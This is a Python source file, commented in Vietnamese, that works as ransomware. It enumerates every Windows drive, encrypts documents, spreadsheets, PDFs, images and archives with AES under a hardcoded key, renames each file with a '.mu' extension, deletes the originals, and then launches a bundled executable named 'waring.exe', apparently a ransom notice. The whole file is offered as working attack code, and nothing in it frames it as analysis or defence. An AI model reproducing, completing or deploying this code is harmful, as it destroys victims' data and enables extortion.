import os
import string
import ctypes
import subprocess
import tempfile
import shutil
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding, hashes
import secrets

# Các phần mở rộng cần mã hóa
TARGET_EXTENSIONS = [
    ".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".png", ".zip", ".rar"
]

# Các thư mục cần bỏ qua để không gây lỗi hệ thống
EXCLUDE_DIRS = [
    "C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)", "C:\\ProgramData",
    "C:\\Users\\All Users", "C:\\Users\\Default", "C:\\Users\\Public", "C:\\$Recycle.Bin"
]

# Sử dụng key mã hóa cứng, băm SHA-256 để ra đúng 32 bytes cho AES
RAW_KEY_STRING = "TWpJMU1qQTBOekVrTWpJMU1qQTBORFFq"

def generate_key_from_raw_string(raw_key: str) -> bytes:
    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(raw_key.encode())
    return digest.finalize()  # 32-byte key for AES-256

def encrypt_file_inplace(file_path: str, key: bytes):
    iv = secrets.token_bytes(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    with open(file_path, 'rb') as f:
        data = f.read()

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    encrypted = encryptor.update(padded_data) + encryptor.finalize()

    # Đổi tên file đích sang .mu
    encrypted_file_path = file_path + '.mu'

    with open(encrypted_file_path, 'wb') as f:
        f.write(iv + encrypted)

    os.remove(file_path)  # Xoá file gốc sau khi mã hóa

    print(f"[✓] Encrypted & Renamed: {encrypted_file_path}")

def should_exclude(path: str) -> bool:
    normalized_path = os.path.abspath(path).lower()
    for exclude_dir in EXCLUDE_DIRS:
        if normalized_path.startswith(os.path.abspath(exclude_dir).lower()):
            return True
    return False

def encrypt_files_in_directory(root_dir: str, key: bytes):
    for dirpath, _, filenames in os.walk(root_dir):
        if should_exclude(dirpath):
            continue
        for file in filenames:
            if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
                full_path = os.path.join(dirpath, file)
                try:
                    encrypt_file_inplace(full_path, key)
                except Exception as e:
                    print(f"[!] Error encrypting {full_path}: {e}")

def get_all_drives():
    drives = []
    bitmask = ctypes.cdll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(f"{letter}:/")
        bitmask >>= 1
    return drives

def extract_and_run_waring():
    try:
        base_path = getattr(sys, '_MEIPASS', os.path.abspath("."))
        waring_src = os.path.join(base_path, 'waring.exe')
        temp_dir = tempfile.mkdtemp()
        waring_dst = os.path.join(temp_dir, 'waring.exe')
        shutil.copy2(waring_src, waring_dst)
        subprocess.Popen(waring_dst, shell=True)
    except Exception as e:
        print(f"[!] Không thể chạy waring.exe: {e}")
def extract_embedded_file(filename: str, output_name: str = None):
    try:
        base_path = getattr(sys, '_MEIPASS', os.path.abspath("."))
        src = os.path.join(base_path, filename)
        dst_dir = tempfile.mkdtemp()
        dst = os.path.join(dst_dir, output_name or filename)
        shutil.copy2(src, dst)
        print(f"[✓] Đã trích xuất: {dst}")
        return dst  # Trả về đường dẫn file vừa giải nén
    except Exception as e:
        print(f"[!] Lỗi giải nén {filename}: {e}")
        return None

# MAIN
if _name_ == "_main_":
    key = generate_key_from_raw_string(RAW_KEY_STRING)

    print("[*] Bắt đầu mã hóa...")
    drives = get_all_drives()
    for drive in drives:
        print(f"[+] Đang duyệt ổ đĩa: {drive}")
        encrypt_files_in_directory(drive, key)

    extract_and_run_waring()